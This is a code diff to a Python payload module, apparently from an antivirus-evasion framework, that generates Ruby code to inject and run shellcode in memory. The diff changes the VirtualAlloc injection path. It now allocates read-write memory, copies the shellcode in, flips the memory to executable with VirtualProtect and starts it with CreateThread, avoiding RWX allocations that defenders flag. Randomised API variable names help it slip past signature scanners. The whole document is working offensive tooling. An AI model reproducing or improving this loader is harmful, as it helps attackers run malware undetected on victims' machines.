@@ -80,19 +80,21 @@ class PayloadModule:
         waitfor_random = evasion_helpers.randomString()
         heapcreate_random = evasion_helpers.randomString()
         heapalloc_random = evasion_helpers.randomString()
+        rand_protect = evasion_helpers.randomString()
+        protect_out = evasion_helpers.randomString()
 
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
-            payload_code += valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
+            payload_code += valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I');" + rand_protect + " = API.new('VirtualProtect', 'PIIP', 'I')\n"
             payload_code += "%s = \"%s\"\n" %(payloadName, Shellcode)
-            payload_code += ptrName + " = " + valloc_random + ".call(0,(" + payloadName + ".length > 0x1000 ? " + payloadName + ".length : 0x1000), 0x1000, 0x40)\n"
+            payload_code += ptrName + " = " + valloc_random + ".call(0,(" + payloadName + ".length > 0x1000 ? " + payloadName + ".length : 0x1000), 0x1000, 0x04)\n"
+            payload_code += "x = " + rtlmove_random + ".call(" + ptrName + "," + payloadName + "," + payloadName + ".length); " + protect_out + " = " + rand_protect + ".call(" + ptrName + ",(" + payloadName + ".length > 0x1000 ? " + payloadName + ".length : 0x1000), 0x20, 0); " + threadName + " = " + createthread_random + ".call(0,0," + ptrName + ",0,0,0); x = " + waitfor_random + ".call(" + threadName + ",0xFFFFFFF)\n"
 
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             payload_code += heapcreate_random + " = API.new('HeapCreate', 'III', 'I');" + heapalloc_random + " = API.new('HeapAlloc', 'III', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
             payload_code += "%s = \"%s\"\n" %(payloadName, Shellcode)
             payload_code += heap_name + " = " + heapcreate_random + ".call(0x0004,(" + payloadName + ".length > 0x1000 ? " + payloadName + ".length : 0x1000), 0)\n"
             payload_code += ptrName + " = " + heapalloc_random + ".call(" + heap_name + ", 0x00000008, " + payloadName + ".length)\n"
-
-        payload_code += "x = " + rtlmove_random + ".call(" + ptrName + "," + payloadName + "," + payloadName + ".length); " + threadName + " = " + createthread_random + ".call(0,0," + ptrName + ",0,0,0); x = " + waitfor_random + ".call(" + threadName + ",0xFFFFFFF)\n"
+            payload_code += "x = " + rtlmove_random + ".call(" + ptrName + "," + payloadName + "," + payloadName + ".length); " + threadName + " = " + createthread_random + ".call(0,0," + ptrName + ",0,0,0); x = " + waitfor_random + ".call(" + threadName + ",0xFFFFFFF)\n"
 
         # Close out all the if statements
         for iteration in range(num_ends_required):
